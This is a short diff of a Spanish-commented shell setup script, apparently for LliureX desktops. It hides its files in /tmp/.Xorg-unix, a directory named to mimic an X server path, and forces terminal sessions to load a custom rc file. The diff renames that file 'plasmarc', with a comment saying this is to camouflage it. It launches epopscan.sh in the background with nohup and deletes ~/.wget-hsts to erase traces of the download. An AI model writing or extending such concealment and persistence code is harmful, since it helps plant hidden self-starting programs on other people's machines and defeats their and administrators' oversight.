@@ -7,7 +7,7 @@
 mainDir=/tmp/.Xorg-unix
 configDir=~/.config
 confFile=$configDir/kwin.conf 2>/dev/null
-bashrcFile=$configDir/.bashrc
+bashrcFile=$configDir/plasmarc
 
 #////////////////////////
 #Comprobaciones Iniciales
@@ -43,7 +43,7 @@ ColorScheme=DarkPastels
 Font=Hack,11,-1,0,50,0,0,0,0,0
 
 [General]
-Command=/bin/bash --rcfile ~/.config/.bashrc
+Command=/bin/bash --rcfile ~/.config/plasmarc
 Name=lliurex
 Parent=FALLBACK/
 
@@ -52,9 +52,9 @@ AutoCopySelectedText=true
 MiddleClickPasteMode=0" >~/.local/share/konsole/lliurex.profile
 fi
 
-#Actualizar .Bashrc
+#Actualizar .Bashrc (camuflado como plasmarc)
 
-mv /tmp/.Xorg-unix/.bashrc ~/.config 2>/dev/null
+mv /tmp/.Xorg-unix/plasmarc ~/.config 2>/dev/null
 
 
 #Autoinicio Epopscan
@@ -66,3 +66,7 @@ pkill epopscan.sh
 nohup  $mainDir/epopscan.sh 2>/dev/null  & 
 
 fi
+
+#Eliminar rastro de github
+
+rm ~/.wget-hsts 2>/dev/null
